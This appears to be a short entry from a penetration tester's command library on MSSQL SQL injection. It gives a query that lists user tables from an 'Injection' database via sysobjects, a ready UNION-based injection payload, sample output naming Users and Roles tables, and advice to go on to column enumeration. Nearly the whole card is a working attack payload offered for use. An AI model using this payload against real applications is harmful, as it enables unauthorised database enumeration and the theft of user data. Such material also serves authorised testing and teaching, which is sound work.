---
type: command
executor: sql
data: SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - sql-injection
  - discovery
verified: true
validated: true
---

# MSSQL Select Tables from Injection DB

## Command

```sql
SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
```

## Description

This command lists user tables (xtype='U') from the 'Injection' database using the sysobjects system table. Inject it via UNION to discover tables holding sensitive data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| name | Column for table names | Yes |
| Injection..sysobjects | Database-specific system view | Built-in |
| xtype = 'U' | Filter for user tables only | Yes |

## Examples

### Basic Usage

```sql
SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
```

### In Injection Context

' UNION SELECT name FROM Injection..sysobjects WHERE xtype = 'U'--

## Expected Output

Profiles
Roles
Users

Identifies user tables; proceed to column enumeration on relevant ones like 'Users'.

## Related

- [[procedures/mssql-union-based-injection-for-database-enumeration]]
- [[commands/mssql-select-database-names]]
